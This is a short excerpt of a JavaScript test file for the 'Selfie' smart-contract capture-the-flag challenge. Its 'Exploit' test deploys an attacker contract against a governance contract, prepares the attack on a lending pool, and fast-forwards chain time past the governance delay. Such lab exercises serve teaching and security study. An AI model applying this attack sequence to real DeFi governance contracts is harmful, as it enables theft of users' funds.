...
describe('[Challenge] Selfie', function () {
  ...
  it('Exploit', async function () {
    ...
    const AttackerFactory = await ethers.getContractFactory('Attacker6', attacker);
    const attackerContract = await AttackerFactory.deploy(this.governance.address);

    await attackerContract.prepareAttack(this.pool.address);
    await ethers.provider.send('evm_increaseTime', [
      Number(await this.governance.getActionDelay()),
    ]);
